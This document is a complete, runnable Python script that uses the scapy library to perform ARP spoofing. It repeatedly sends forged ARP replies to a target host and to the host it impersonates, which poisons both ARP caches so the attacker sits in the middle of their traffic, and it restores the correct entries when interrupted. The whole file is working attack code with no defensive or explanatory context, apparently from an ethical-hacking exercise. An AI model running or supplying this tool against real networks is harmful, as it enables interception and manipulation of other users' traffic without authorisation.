#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '-target', dest='target_ip', help='Target IP')
    parser.add_argument('-s', '-spoof', dest='spoof_ip', help='Spoof IP')
    options = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a target IP.")
    elif not options.spoof_ip:
        parser.error("[-] Please specify the Spoof IP.")

    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())

sent_packets_count = 0
options = get_arguments()
try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        sent_packets_count = sent_packets_count + 2
        print('\r[+] Packets sent:' + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTR + C ...... Quitting.")
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)